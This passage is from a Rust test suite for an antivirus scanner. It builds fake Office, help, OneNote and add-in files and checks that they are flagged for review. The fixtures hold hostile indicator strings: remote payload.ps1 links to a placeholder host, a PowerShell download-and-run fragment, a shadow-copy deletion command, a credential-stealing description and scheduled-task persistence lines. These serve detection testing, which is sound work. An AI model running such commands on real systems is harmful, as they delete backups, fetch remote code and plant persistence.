            "expected deflated OOXML macro relationship review detection: {report:#?}"
        );
        assert_eq!(report.quarantined_files, 0);
        assert!(document.exists());
    }

    #[test]
    fn quick_scan_reports_data_descriptor_ooxml_macro_relationship_for_review() {
        let dir = tempdir().unwrap();
        let downloads = dir.path().join("Downloads");
        fs::create_dir_all(&downloads).unwrap();
        let document = downloads.join("descriptor-invoice.docm");
        fs::write(
            &document,
            ooxml_macro_package_with_data_descriptors(&[
                (
                    b"word/vbaProject.bin".as_slice(),
                    0,
                    b"macro project placeholder".as_slice(),
                ),
                (
                    b"word/_rels/document.xml.rels".as_slice(),
                    8,
                    br#"<Relationship TargetMode="External" Target="https://example.invalid/payload.ps1"/>"#.as_slice(),
                ),
            ]),
        )
        .unwrap();

        let report = scan_paths(
            vec![downloads],
            ScanActionMode::AutoQuarantineConfirmedOnly,
            ScanKind::Quick,
            None,
        )
        .unwrap();

        assert_eq!(report.status, ReportStatus::ThreatsFound, "{report:#?}");
        assert!(
            report.threats.iter().any(|threat| {
                threat.file_name == "descriptor-invoice.docm"
                    && threat.detection_type == DetectionType::Heuristic
                    && threat.threat_category == ThreatCategory::MaliciousMacro
                    && matches!(
                        threat.risk_score.verdict,
                        RiskVerdict::Suspicious | RiskVerdict::ProbableMalware
                    )
                    && threat.status == ThreatResultStatus::Detected
                    && threat
                        .risk_score
                        .reasons
                        .iter()
                        .any(|reason| reason.id == "ooxml_macro_external_remote_relationship")
            }),
            "expected data-descriptor OOXML macro relationship review detection: {report:#?}"
        );
        assert_eq!(report.quarantined_files, 0);
        assert!(document.exists());
    }

    #[test]
    fn quick_scan_reports_no_threat_for_encrypted_ooxml_relationship_body() {
        let dir = tempdir().unwrap();
        let downloads = dir.path().join("Downloads");
        fs::create_dir_all(&downloads).unwrap();
        let document = downloads.join("encrypted-invoice.docm");
        fs::write(
            &document,
            ooxml_macro_package_with_method_flags(&[
                (
                    b"word/vbaProject.bin".as_slice(),
                    0,
                    0,
                    b"macro project placeholder".as_slice(),
                ),
                (
                    b"word/_rels/document.xml.rels".as_slice(),
                    0,
                    0x0001,
                    br#"<Relationship TargetMode="External" Target="https://example.invalid/payload.ps1"/>"#.as_slice(),
                ),
            ]),
        )
        .unwrap();

        let report = scan_paths(
            vec![downloads],
            ScanActionMode::AutoQuarantineConfirmedOnly,
            ScanKind::Quick,
            None,
        )
        .unwrap();

        assert_eq!(report.status, ReportStatus::Clean, "{report:#?}");
        assert_eq!(report.threats_found, 0);
        assert!(report.threats.is_empty(), "{report:#?}");
        assert_eq!(report.quarantined_files, 0);
        assert!(document.exists());
    }

    #[test]
    fn quick_scan_reports_no_threat_for_unsupported_ooxml_relationship_compression() {
        let dir = tempdir().unwrap();
        let downloads = dir.path().join("Downloads");
        fs::create_dir_all(&downloads).unwrap();
        let document = downloads.join("unsupported-compression-invoice.docm");
        fs::write(
            &document,
            ooxml_macro_package_with_method_flags(&[
                (
                    b"word/vbaProject.bin".as_slice(),
                    0,
                    0,
                    b"macro project placeholder".as_slice(),
                ),
                (
                    b"word/_rels/document.xml.rels".as_slice(),
                    99,
                    0,
                    br#"<Relationship TargetMode="External" Target="https://example.invalid/payload.ps1"/>"#.as_slice(),
                ),
            ]),
        )
        .unwrap();

        let report = scan_paths(
            vec![downloads],
            ScanActionMode::AutoQuarantineConfirmedOnly,
            ScanKind::Quick,
            None,
        )
        .unwrap();

        assert_eq!(report.status, ReportStatus::Clean, "{report:#?}");
        assert_eq!(report.threats_found, 0);
        assert!(report.threats.is_empty(), "{report:#?}");
        assert_eq!(report.quarantined_files, 0);
        assert!(document.exists());
    }

    #[test]
    fn quick_scan_reports_help_and_note_carriers_for_review() {
        let dir = tempdir().unwrap();
        let downloads = dir.path().join("Downloads");
        fs::create_dir_all(&downloads).unwrap();
        let help = downloads.join("support.chm");
        let note = downloads.join("meeting.onepkg");
        fs::write(
            &help,
            b"<object data=\"https://example.invalid/payload.js\"></object>",
        )
        .unwrap();
        fs::write(
            &note,
            b"Attachment preview: powershell downloadstring start-process",
        )
        .unwrap();

        let report = scan_paths(
            vec![downloads],
            ScanActionMode::AutoQuarantineConfirmedOnly,
            ScanKind::Quick,
            None,
        )
        .unwrap();

        assert_eq!(report.status, ReportStatus::ThreatsFound, "{report:#?}");
        for file_name in ["support.chm", "meeting.onepkg"] {
            assert!(
                report.threats.iter().any(|threat| {
                    threat.file_name == file_name
                        && threat.detection_type == DetectionType::Heuristic
                        && threat.threat_category == ThreatCategory::SuspiciousDownloader
                        && matches!(
                            threat.risk_score.verdict,
                            RiskVerdict::Suspicious | RiskVerdict::ProbableMalware
                        )
                        && threat.status == ThreatResultStatus::Detected
                        && threat
                            .risk_score
                            .reasons
                            .iter()
                            .any(|reason| reason.id == "help_note_remote_script_launch")
                }),
                "expected help/OneNote carrier review detection for {file_name}: {report:#?}"
            );
        }
        assert_eq!(report.quarantined_files, 0);
        assert!(help.exists());
        assert!(note.exists());
    }

    #[test]
    fn quick_scan_reports_office_addin_carriers_for_review() {
        let dir = tempdir().unwrap();
        let downloads = dir.path().join("Downloads");
        fs::create_dir_all(&downloads).unwrap();
        let spreadsheet_addin = downloads.join("addin-loader.xlam");
        let binary_addin = downloads.join("report-addin.xll");
        fs::write(
            &spreadsheet_addin,
            b"<Relationship Target=\"https://example.invalid/payload.ps1\" />",
        )
        .unwrap();
        fs::write(
            &binary_addin,
            b"Add-in metadata: powershell downloadstring start-process",
        )
        .unwrap();

        let report = scan_paths(
            vec![downloads],
            ScanActionMode::AutoQuarantineConfirmedOnly,
            ScanKind::Quick,
            None,
        )
        .unwrap();

        assert_eq!(report.status, ReportStatus::ThreatsFound, "{report:#?}");
        for file_name in ["addin-loader.xlam", "report-addin.xll"] {
            assert!(
                report.threats.iter().any(|threat| {
                    threat.file_name == file_name
                        && threat.detection_type == DetectionType::Heuristic
                        && threat.threat_category == ThreatCategory::SuspiciousDownloader
                        && matches!(
                            threat.risk_score.verdict,
                            RiskVerdict::Suspicious | RiskVerdict::ProbableMalware
                        )
                        && threat.status == ThreatResultStatus::Detected
                        && threat
                            .risk_score
                            .reasons
                            .iter()
                            .any(|reason| reason.id == "office_addin_remote_script_launch")
                }),
                "expected Office add-in carrier review detection for {file_name}: {report:#?}"
            );
        }
        assert_eq!(report.quarantined_files, 0);
        assert!(spreadsheet_addin.exists());
        assert!(binary_addin.exists());
    }

    #[test]
    fn quick_scan_reports_ransom_note_backup_delete_script_for_review() {
        let dir = tempdir().unwrap();
        let downloads = dir.path().join("Downloads");
        fs::create_dir_all(&downloads).unwrap();
        let file = downloads.join("ransom-note-review.ps1");
        fs::write(
            &file,
            b"your files have been encrypted. decrypt your files. vssadmin delete shadows /all /quiet",
        )
        .unwrap();

        let report = scan_paths(
            vec![downloads],
            ScanActionMode::AutoQuarantineConfirmedOnly,
            ScanKind::Quick,
            None,
        )
        .unwrap();

        assert_eq!(report.status, ReportStatus::ThreatsFound, "{report:#?}");
        assert!(
            report.threats.iter().any(|threat| {
                threat.file_name == "ransom-note-review.ps1"
                    && threat.threat_category == ThreatCategory::Ransomware
                    && matches!(
                        threat.risk_score.verdict,
                        RiskVerdict::Suspicious | RiskVerdict::ProbableMalware
                    )
                    && threat.status == ThreatResultStatus::Detected
                    && threat
                        .risk_score
                        .reasons
                        .iter()
                        .any(|reason| reason.id == "ZNE-RULE-RANSOM-BACKUP-DELETE-NOTE")
                    && threat
                        .risk_score
                        .reasons
                        .iter()
                        .any(|reason| reason.id == "ZNE-RANSOM-BACKUP-TAMPER-001")
            }),
            "expected ransomware note/backup-delete review detection: {report:#?}"
        );
        assert_eq!(report.quarantined_files, 0);
        assert!(file.exists());
    }

    #[test]
    fn quick_scan_reports_infostealer_indicator_script_for_review() {
        let dir = tempdir().unwrap();
        let downloads = dir.path().join("Downloads");
        fs::create_dir_all(&downloads).unwrap();
        let file = downloads.join("collector.js");
        fs::write(
            &file,
            b"read browser credentials from Login Data and wallet.dat then zip staging archive and POST to http://127.0.0.1/upload",
        )
        .unwrap();

        let report = scan_paths(
            vec![downloads],
            ScanActionMode::AutoQuarantineConfirmedOnly,
            ScanKind::Quick,
            None,
        )
        .unwrap();

        assert_eq!(report.status, ReportStatus::ThreatsFound, "{report:#?}");
        assert!(
            report.threats.iter().any(|threat| {
                threat.file_name == "collector.js"
                    && threat.threat_category == ThreatCategory::Infostealer
                    && matches!(
                        threat.risk_score.verdict,
                        RiskVerdict::Suspicious | RiskVerdict::ProbableMalware
                    )
                    && threat.status == ThreatResultStatus::Detected
            }),
            "expected infostealer indicator review detection: {report:#?}"
        );
        assert_eq!(report.quarantined_files, 0);
        assert!(file.exists());
    }

    #[test]
    fn quick_scan_reports_miner_pup_script_for_review() {
        let dir = tempdir().unwrap();
        let downloads = dir.path().join("Downloads");
        fs::create_dir_all(&downloads).unwrap();
        let file = downloads.join("miner-config.ps1");
        fs::write(
            &file,
            b"stratum+tcp://pool.example.invalid schtasks /create /tn worker",
        )
        .unwrap();

        let report = scan_paths(
            vec![downloads],
            ScanActionMode::AutoQuarantineConfirmedOnly,
            ScanKind::Quick,
            None,
        )
        .unwrap();

        assert_eq!(report.status, ReportStatus::ThreatsFound, "{report:#?}");
        assert!(
            report.threats.iter().any(|threat| {
                threat.file_name == "miner-config.ps1"
                    && threat.threat_category == ThreatCategory::Miner
                    && threat.risk_score.verdict != RiskVerdict::ConfirmedMalware
                    && threat.status == ThreatResultStatus::Detected
            }),
            "expected miner/PUP indicator review detection: {report:#?}"
        );
        assert_eq!(report.quarantined_files, 0);
        assert!(file.exists());
    }

    #[test]
    fn quick_scan_reports_persistence_script_for_review() {
        let dir = tempdir().unwrap();
        let downloads = dir.path().join("Downloads");
        fs::create_dir_all(&downloads).unwrap();
        let file = downloads.join("startup-task.ps1");
        fs::write(
            &file,
            b"schtasks /create /tn Updater /tr C:\\Users\\Public\\updater.exe; New-Service -Name Updater -BinaryPathName C:\\Users\\Public\\updater.exe",
        )
        .unwrap();

        let report = scan_paths(
            vec![downloads],
            ScanActionMode::AutoQuarantineConfirmedOnly,
            ScanKind::Quick,
            None,
        )
        .unwrap();

        assert_eq!(report.status, ReportStatus::ThreatsFound, "{report:#?}");
        assert!(
            report.threats.iter().any(|threat| {
                threat.file_name == "startup-task.ps1"
                    && threat.threat_category == ThreatCategory::PersistenceIndicator
                    && matches!(
                        threat.risk_score.verdict,
                        RiskVerdict::Suspicious | RiskVerdict::ProbableMalware
                    )
                    && threat.status == ThreatResultStatus::Detected
            }),
            "expected persistence indicator review detection: {report:#?}"
        );
        assert_eq!(report.quarantined_files, 0);
        assert!(file.exists());
    }

    fn zip_with_entry_name(name: &[u8]) -> Vec<u8> {
        let mut bytes = Vec::new();
        bytes.extend_from_slice(b"PK\x03\x04");
        bytes.extend_from_slice(&[0; 22]);
        bytes.extend_from_slice(&(name.len() as u16).to_le_bytes());
        bytes.extend_from_slice(&0u16.to_le_bytes());
        bytes.extend_from_slice(name);
        bytes
    }

    fn disk_image_with_text(text: &[u8]) -> Vec<u8> {
        let mut bytes = vec![0u8; 32 * 1024];
        bytes.extend_from_slice(b"CD001");
        bytes.extend_from_slice(text);
        bytes
    }

    fn ooxml_macro_package(
        vba_project_name: &[u8],
        relationship_name: &[u8],
        relationship_body: &[u8],
    ) -> Vec<u8> {
        zip_with_stored_entries(&[
            (vba_project_name, b"macro project placeholder".as_slice()),
            (relationship_name, relationship_body),
        ])
    }

    fn ooxml_macro_package_with_methods(entries: &[(&[u8], u16, &[u8])]) -> Vec<u8> {
        let entries = entries
            .iter()
            .map(|(name, method, body)| (*name, *method, 0, *body))
            .collect::<Vec<_>>();
        ooxml_macro_package_with_method_flags(&entries)
    }

    fn ooxml_macro_package_with_method_flags(entries: &[(&[u8], u16, u16, &[u8])]) -> Vec<u8> {
        let mut bytes = Vec::new();
        for (name, method, flags, body) in entries {
            let payload = if *method == 8 {
                deflate_raw(body)
            } else {
                body.to_vec()
            };
            bytes.extend_from_slice(b"PK\x03\x04");
            bytes.extend_from_slice(&20u16.to_le_bytes());
            bytes.extend_from_slice(&flags.to_le_bytes());
            bytes.extend_from_slice(&method.to_le_bytes());
            bytes.extend_from_slice(&0u16.to_le_bytes());
            bytes.extend_from_slice(&0u16.to_le_bytes());
            bytes.extend_from_slice(&0u32.to_le_bytes());
            bytes.extend_from_slice(&(payload.len() as u32).to_le_bytes());
            bytes.extend_from_slice(&(body.len() as u32).to_le_bytes());
            bytes.extend_from_slice(&(name.len() as u16).to_le_bytes());
            bytes.extend_from_slice(&0u16.to_le_bytes());
            bytes.extend_from_slice(name);
            bytes.extend_from_slice(&payload);
        }
        bytes
    }

    fn ooxml_macro_package_with_data_descriptors(entries: &[(&[u8], u16, &[u8])]) -> Vec<u8> {
        let mut bytes = Vec::new();
        let mut central_entries = Vec::new();
        for (name, method, body) in entries {
            let payload = if *method == 8 {
                deflate_raw(body)
            } else {
                body.to_vec()
            };
            let local_header_offset = bytes.len();
            bytes.extend_from_slice(b"PK\x03\x04");
            bytes.extend_from_slice(&20u16.to_le_bytes());
            bytes.extend_from_slice(&0x0008u16.to_le_bytes());
            bytes.extend_from_slice(&method.to_le_bytes());
            bytes.extend_from_slice(&0u16.to_le_bytes());
            bytes.extend_from_slice(&0u16.to_le_bytes());
            bytes.extend_from_slice(&0u32.to_le_bytes());
            bytes.extend_from_slice(&0u32.to_le_bytes());
            bytes.extend_from_slice(&0u32.to_le_bytes());
            bytes.extend_from_slice(&(name.len() as u16).to_le_bytes());
            bytes.extend_from_slice(&0u16.to_le_bytes());
            bytes.extend_from_slice(name);
            bytes.extend_from_slice(&payload);
            bytes.extend_from_slice(b"PK\x07\x08");
            bytes.extend_from_slice(&0u32.to_le_bytes());
            bytes.extend_from_slice(&(payload.len() as u32).to_le_bytes());
            bytes.extend_from_slice(&(body.len() as u32).to_le_bytes());
            central_entries.push((
                (*name).to_vec(),
                *method,
                payload.len(),
                body.len(),
                local_header_offset,
            ));
        }
        let central_directory_offset = bytes.len();
        for (name, method, compressed_size, uncompressed_size, local_header_offset) in
            &central_entries
        {
            bytes.extend_from_slice(b"PK\x01\x02");
            bytes.extend_from_slice(&20u16.to_le_bytes());
            bytes.extend_from_slice(&20u16.to_le_bytes());
            bytes.extend_from_slice(&0x0008u16.to_le_bytes());
            bytes.extend_from_slice(&method.to_le_bytes());
            bytes.extend_from_slice(&0u16.to_le_bytes());
            bytes.extend_from_slice(&0u16.to_le_bytes());
            bytes.extend_from_slice(&0u32.to_le_bytes());
            bytes.extend_from_slice(&(*compressed_size as u32).to_le_bytes());
            bytes.extend_from_slice(&(*uncompressed_size as u32).to_le_bytes());
            bytes.extend_from_slice(&(name.len() as u16).to_le_bytes());
            bytes.extend_from_slice(&0u16.to_le_bytes());
            bytes.extend_from_slice(&0u16.to_le_bytes());
            bytes.extend_from_slice(&0u16.to_le_bytes());
            bytes.extend_from_slice(&0u16.to_le_bytes());
            bytes.extend_from_slice(&0u32.to_le_bytes());
            bytes.extend_from_slice(&(*local_header_offset as u32).to_le_bytes());
            bytes.extend_from_slice(name);
        }
        let central_directory_size = bytes.len() - central_directory_offset;
        bytes.extend_from_slice(b"PK\x05\x06");
        bytes.extend_from_slice(&0u16.to_le_bytes());
        bytes.extend_from_slice(&0u16.to_le_bytes());
        bytes.extend_from_slice(&(central_entries.len() as u16).to_le_bytes());
        bytes.extend_from_slice(&(central_entries.len() as u16).to_le_bytes());
        bytes.extend_from_slice(&(central_directory_size as u32).to_le_bytes());
        bytes.extend_from_slice(&(central_directory_offset as u32).to_le_bytes());
        bytes.extend_from_slice(&0u16.to_le_bytes());
        bytes
    }

    fn deflate_raw(body: &[u8]) -> Vec<u8> {
        use flate2::write::DeflateEncoder;
        use flate2::Compression;
        use std::io::Write;

        let mut encoder = DeflateEncoder::new(Vec::new(), Compression::fast());
        encoder.write_all(body).unwrap();
        encoder.finish().unwrap()
    }

    fn zip_with_stored_entries(entries: &[(&[u8], &[u8])]) -> Vec<u8> {
        let mut bytes = Vec::new();
        for (name, body) in entries {
            bytes.extend_from_slice(b"PK\x03\x04");
            bytes.extend_from_slice(&20u16.to_le_bytes());
            bytes.extend_from_slice(&0u16.to_le_bytes());
            bytes.extend_from_slice(&0u16.to_le_bytes());
            bytes.extend_from_slice(&0u16.to_le_bytes());
            bytes.extend_from_slice(&0u16.to_le_bytes());
            bytes.extend_from_slice(&0u32.to_le_bytes());
            bytes.extend_from_slice(&(body.len() as u32).to_le_bytes());
            bytes.extend_from_slice(&(body.len() as u32).to_le_bytes());
            bytes.extend_from_slice(&(name.len() as u16).to_le_bytes());
            bytes.extend_from_slice(&0u16.to_le_bytes());
            bytes.extend_from_slice(name);
            bytes.extend_from_slice(body);
        }
        bytes
    }

    fn zip_with_owned_stored_entries(entries: &[(Vec<u8>, Vec<u8>)]) -> Vec<u8> {
        let borrowed = entries
            .iter()
            .map(|(name, body)| (name.as_slice(), body.as_slice()))
            .collect::<Vec<_>>();
        zip_with_stored_entries(&borrowed)
    }

    fn zip_with_nested_archive_chain(names: &[&[u8]]) -> Vec<u8> {
        let mut body = zip_with_stored_entries(&[(b"payload/leaf.txt", b"benign nested leaf")]);
        for name in names.iter().rev() {
            body = zip_with_stored_entries(&[(*name, &body)]);
        }
        body
    }

    fn zip_with_truncated_stored_entry(name: &[u8], declared_size: u32, body: &[u8]) -> Vec<u8> {
        zip_with_local_entry_and_sizes(name, 0, 0, declared_size, declared_size, body)
    }

    fn zip_with_local_entry(name: &[u8], flags: u16, method: u16, body: &[u8]) -> Vec<u8> {
        let size = body.len() as u32;
        zip_with_local_entry_and_sizes(name, flags, method, size, size, body)
    }

    fn zip_with_local_entry_and_sizes(
        name: &[u8],
        flags: u16,
        method: u16,
        compressed_size: u32,
        uncompressed_size: u32,
        body: &[u8],
    ) -> Vec<u8> {
        let mut bytes = Vec::new();
        bytes.extend_from_slice(b"PK\x03\x04");
        bytes.extend_from_slice(&20u16.to_le_bytes());
        bytes.extend_from_slice(&flags.to_le_bytes());
        bytes.extend_from_slice(&method.to_le_bytes());
        bytes.extend_from_slice(&0u16.to_le_bytes());
        bytes.extend_from_slice(&0u16.to_le_bytes());
        bytes.extend_from_slice(&0u32.to_le_bytes());
        bytes.extend_from_slice(&compressed_size.to_le_bytes());
        bytes.extend_from_slice(&uncompressed_size.to_le_bytes());
        bytes.extend_from_slice(&(name.len() as u16).to_le_bytes());
        bytes.extend_from_slice(&0u16.to_le_bytes());
        bytes.extend_from_slice(name);
        bytes.extend_from_slice(body);
        bytes
    }

    fn compound_file_fixture() -> Vec<u8> {
        vec![0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1]
    }

    fn zip_with_deflated_entries(entries: &[(&[u8], &[u8])]) -> Vec<u8> {
        let entries = entries
            .iter()
            .map(|(name, body)| (*name, 8, *body))
            .collect::<Vec<_>>();
        ooxml_macro_package_with_methods(&entries)
    }

    #[test]
    fn auto_quarantine_failure_is_reported_without_hiding_detection() {
        let _lock = env_lock();
        let dir = tempdir().unwrap();
        let file = dir.path().join("safe-eicar.com");
        let invalid_quarantine_base = dir.path().join("not-a-directory");
        fs::write(&file, "ZENTOR-SAFE-EICAR-SIMULATOR-FILE").unwrap();
        fs::write(
            &invalid_quarantine_base,
            "blocks quarantine directory creation",
        )
        .unwrap();
        std::env::set_var("AVORAX_QUARANTINE_DIR", &invalid_quarantine_base);

        let report = scan_paths(
            vec![file.clone()],
            ScanActionMode::AutoQuarantineConfirmedOnly,
            ScanKind::Custom,
            None,
        )
        .unwrap();

        assert_eq!(report.status, ReportStatus::ThreatsFound);
        assert_eq!(report.quarantined_files, 0);
        assert!(file.exists());
        assert!(report.threats.iter().any(|threat| {
            threat.confidence == ThreatConfidence::Confirmed
                && threat.status == ThreatResultStatus::Detected
        }));
        assert!(report
            .scan_errors
            .iter()
            .any(|error| error.contains("auto-quarantine failed")));
        std::env::remove_var("AVORAX_QUARANTINE_DIR");
    }

    #[test]
    fn normal_exe_is_not_confirmed_threat() {
        let dir = tempdir().unwrap();
        let downloads = dir.path().join("Downloads");
        fs::create_dir_all(&downloads).unwrap();
        let file = downloads.join("vpn-installer.exe");
        fs::write(&file, "normal installer").unwrap();

        let report = scan_paths(
            vec![file.clone()],
            ScanActionMode::AutoQuarantineAllDetections,
            ScanKind::Custom,
            None,
        )
        .unwrap();

        assert!(file.exists());
        assert!(report
            .threats
            .iter()
            .all(|threat| threat.confidence != ThreatConfidence::Confirmed));
        assert_eq!(report.quarantined_files, 0);
    }

    #[test]
    fn guard_mode_config_writer_normalizes_user_mode() {
        let _lock = env_lock();
        let dir = tempdir().unwrap();
        let config = dir.path().join("guard_mode.json");
        std::env::set_var("AVORAX_GUARD_MODE_CONFIG", &config);

        let path = write_guard_mode_config("Block Confirmed Threats").unwrap();
        let raw = fs::read_to_string(path).unwrap();
        assert!(raw.contains("\"mode\": \"blockConfirmedThreats\""));

        std::env::remove_var("AVORAX_GUARD_MODE_CONFIG");
    }

    #[test]
    fn guard_mode_config_writer_uses_staged_write_without_temp_leftover() {
        let _lock = env_lock();
        let dir = tempdir().unwrap();
        let config = dir.path().join("guard_mode.json");
        let temp = dir.path().join("guard_mode.json.tmp");
        std::env::set_var("AVORAX_GUARD_MODE_CONFIG", &config);

        write_guard_mode_config("balanced").unwrap();

        assert!(config.exists());
        assert!(!temp.exists());
        std::env::remove_var("AVORAX_GUARD_MODE_CONFIG");
    }

    #[test]
    fn config_writer_uses_non_following_exclusive_staged_writes() {
        let source = include_str!("main.rs");
        let start = source.find("fn ensure_config_parent(").unwrap();
        let end = start + source[start..].find("fn normalize_guard_mode(").unwrap();
        let config_source = &source[start..end];
        let old_write_pattern = ["std::fs::write(&temp_", "path"].concat();
        let old_cleanup_pattern = ["let _ = std::fs::remove_", "file(&temp_path);"].concat();

        assert!(config_source
            .contains("ensure_config_directory(parent, \"configuration parent directory\")?"));
        assert!(config_source.contains("write_config_file_exclusive"));
        assert!(config_source.contains("cleanup_staged_local_core_file"));
        assert!(config_source.contains("failed to clean up temporary configuration file"));
        assert!(config_source.contains(".create_new(true)"));
        assert!(config_source.contains("sync_all()"));
        assert!(config_source.contains("remove_existing_config_file(path, \"configuration file\")"));
        assert!(config_source.contains("Uuid::new_v4()"));
        assert!(!config_source.contains("path.exists()"));
        assert!(!config_source.contains("temp_path.exists()"));
        assert!(!config_source.contains("std::fs::metadata(path)?"));
        assert!(!config_source.contains(&old_write_pattern));
        assert!(!config_source.contains(&old_cleanup_pattern));
    }

    #[test]
    fn config_temp_extension_default_is_explicit() {
        let source = include_str!("main.rs");
        let write_start = source.find("fn write_config_staged").unwrap();
        let metadata_start = source.find("fn ensure_config_metadata_safe").unwrap();
        let config_source = &source[write_start..metadata_start];

        assert_eq!(config_temp_extension(Path::new("guard_mode.toml")), "toml");
        assert_eq!(config_temp_extension(Path::new("guard_mode")), "json");
        assert!(config_source.contains("config_temp_extension(path)"));
        assert!(config_source.contains("Some(extension) => extension"));
        assert!(config_source.contains("None => default_config_temp_extension()"));
        assert!(!config_source.contains(".unwrap_or(\"json\")"));
    }

    #[test]
    fn shared_config_root_rejects_relative_override() {
        let _lock = env_lock();
        let previous = std::env::var_os("AVORAX_CONFIG_DIR");
        std::env::set_var("AVORAX_CONFIG_DIR", "relative-config");

        let error = guard_config_base().unwrap_err().to_string();

        match previous {
            Some(value) => std::env::set_var("AVORAX_CONFIG_DIR", value),
            None => std::env::remove_var("AVORAX_CONFIG_DIR"),
        }
        assert!(error.contains("AVORAX_CONFIG_DIR must be an absolute local path"));
    }

    #[test]
    fn guard_mode_config_rejects_relative_direct_path() {
        let _lock = env_lock();
        let previous = std::env::var_os("AVORAX_GUARD_MODE_CONFIG");
        std::env::set_var("AVORAX_GUARD_MODE_CONFIG", "relative-guard-mode.json");

        let error = write_guard_mode_config("balanced").unwrap_err().to_string();

        match previous {
            Some(value) => std::env::set_var("AVORAX_GUARD_MODE_CONFIG", value),
            None => std::env::remove_var("AVORAX_GUARD_MODE_CONFIG"),
        }
        assert!(error.contains("AVORAX_GUARD_MODE_CONFIG must be an absolute local path"));
    }

    #[test]
    fn shared_config_paths_have_no_relative_fallback() {
        let source = include_str!("main.rs");
        let start = source.find("fn ransomware_guard_config_path").unwrap();
        let end = source.find("#[cfg(test)]").unwrap();
        let config_source = &source[start..end];

        assert!(
            config_source.contains("fn ransomware_guard_config_path() -> anyhow::Result<PathBuf>")
        );
        assert!(config_source.contains("fn guard_mode_config_path() -> anyhow::Result<PathBuf>"));
        assert!(config_source.contains("fn guard_config_base() -> anyhow::Result<PathBuf>"));
        assert!(config_source.contains("absolute_config_env_path(\"AVORAX_CONFIG_DIR\")?"));
        assert!(config_source.contains("absolute_config_env_path(\"AVORAX_GUARD_MODE_CONFIG\")?"));
        assert!(config_source.contains("config_root_is_allowed(&path)"));
        assert!(config_source.contains("local-core shared config root is unavailable"));
        assert!(!config_source.contains("PathBuf::from(\".avorax/config\")"));
        assert!(!config_source.contains("std::env::var(\"AVORAX_CONFIG_DIR\")"));
        assert!(!config_source.contains("std::env::var(\"AVORAX_GUARD_MODE_CONFIG\")"));
    }

    #[cfg(unix)]
    #[test]
    fn guard_mode_config_writer_rejects_symbolic_link_target() {
        use std::os::unix::fs::symlink;

        let _lock = env_lock();
        let dir = tempdir().unwrap();
        let target = dir.path().join("external.json");
        let config = dir.path().join("guard_mode.json");
        fs::write(&target, "{}").unwrap();
        symlink(&target, &config).unwrap();
        std::env::set_var("AVORAX_GUARD_MODE_CONFIG", &config);

        let error = write_guard_mode_config("balanced").unwrap_err().to_string();

        assert!(error.contains("symbolic link"));
        assert_eq!(fs::read_to_string(target).unwrap(), "{}");
        std::env::remove_var("AVORAX_GUARD_MODE_CONFIG");
    }

    #[test]
    fn guard_mode_config_rejects_unknown_mode() {
        let _lock = env_lock();
        assert!(write_guard_mode_config("block everything").is_err());
    }

    #[test]
    fn ransomware_guard_config_writer_uses_staged_write_without_temp_leftover() {
        let _lock = env_lock();
        let dir = tempdir().unwrap();
        let config = dir.path().join("ransomware_guard.json");
        let temp = dir.path().join("ransomware_guard.json.tmp");
        let documents = dir.path().join("Documents");
        fs::create_dir_all(&documents).unwrap();
        std::env::set_var("AVORAX_RANSOMWARE_GUARD_CONFIG", &config);

        write_ransomware_guard_config(vec![documents.display().to_string()], vec![]).unwrap();

        assert!(config.exists());
        assert!(!temp.exists());
        std::env::remove_var("AVORAX_RANSOMWARE_GUARD_CONFIG");
    }

    #[test]
    fn native_recommended_action_keeps_policy_review_items_review_only() {
        assert_eq!(
            native_recommended_action("review_or_quarantine_by_policy"),
            RecommendedAction::Review
        );
        assert_eq!(
            native_recommended_action("review"),
            RecommendedAction::Review
        );
        assert_eq!(
            native_recommended_action("quarantine"),
            RecommendedAction::Quarantine
        );
        assert_eq!(
            native_recommended_action("stop_and_quarantine"),
            RecommendedAction::Quarantine
        );
    }

    #[test]
    fn auto_quarantine_all_mode_does_not_quarantine_high_confidence_probable() {
        let threat = ThreatResult {
            id: "review".to_string(),
            path: "C:\\Users\\Brent\\Downloads\\review.exe".to_string(),
            file_name: "review.exe".to_string(),
            sha256: "abc".to_string(),
            size_bytes: 4,
            detection_type: DetectionType::Heuristic,
            threat_category: ThreatCategory::Unknown,
            threat_name: "Probable Review Item".to_string(),
            confidence: ThreatConfidence::High,
            engine: "Avorax Native Engine".to_string(),
            detected_at: Utc::now(),
            recommended_action: RecommendedAction::Review,
            status: ThreatResultStatus::Detected,
            quarantine_id: None,
            quarantine_path: None,
            quarantine_action_taken: None,
            risk_score: RiskScore {
                score: 72,
                verdict: RiskVerdict::ProbableMalware,
                confidence: ThreatConfidence::High,
                reasons: vec![RiskReason {
                    id: "probable_review".to_string(),
                    title: "Probable review item".to_string(),
                    detail: "Multiple suspicious indicators require review.".to_string(),
                    weight: 72,
                    severity: RiskSeverity::High,
                    source: RiskReasonSource::Heuristic,
                }],
                recommended_action: RecommendedAction::Review,
                engines_used: vec![RiskEngine::Heuristic],
            },
            reason_summary: "Probable malware requires review.".to_string(),
        };

        assert!(!native_should_quarantine(
            ScanActionMode::AutoQuarantineAllDetections,
            &threat
        ));
    }

    #[test]
    fn auto_quarantine_all_mode_still_quarantines_confirmed_malware() {
        let threat = ThreatResult {
            id: "confirmed".to_string(),
            path: "C:\\Users\\Brent\\Downloads\\bad.exe".to_string(),
            file_name: "bad.exe".to_string(),
            sha256: "def".to_string(),
            size_bytes: 4,
            detection_type: DetectionType::Signature,
            threat_category: ThreatCategory::Trojan,
            threat_name: "Confirmed Threat".to_string(),
            confidence: ThreatConfidence::Confirmed,
            engine: "Avorax Native Engine".to_string(),
            detected_at: Utc::now(),
            recommended_action: RecommendedAction::Quarantine,
            status: ThreatResultStatus::Detected,
            quarantine_id: None,
            quarantine_path: None,
            quarantine_action_taken: None,
            risk_score: RiskScore {
                score: 100,
                verdict: RiskVerdict::ConfirmedMalware,
                confidence: ThreatConfidence::Confirmed,
                reasons: vec![RiskReason {
                    id: "confirmed_signature".to_string(),
                    title: "Confirmed signature".to_string(),
                    detail: "Confirmed malware signature.".to_string(),
                    weight: 100,
                    severity: RiskSeverity::Critical,
                    source: RiskReasonSource::Signature,
                }],
                recommended_action: RecommendedAction::Quarantine,
                engines_used: vec![RiskEngine::Signature],
            },
            reason_summary: "Confirmed malware signature.".to_string(),
        };

        assert!(native_should_quarantine(
            ScanActionMode::AutoQuarantineAllDetections,
            &threat
        ));
    }

    #[test]
    fn block_confirmed_mode_does_not_quarantine_probable_review_item() {
        let mut input =
            ApplicationControlInput::for_path("C:\\Users\\Brent\\Downloads\\review.exe");
        input.probable_malware = true;
        input.strong_risk_signal = true;
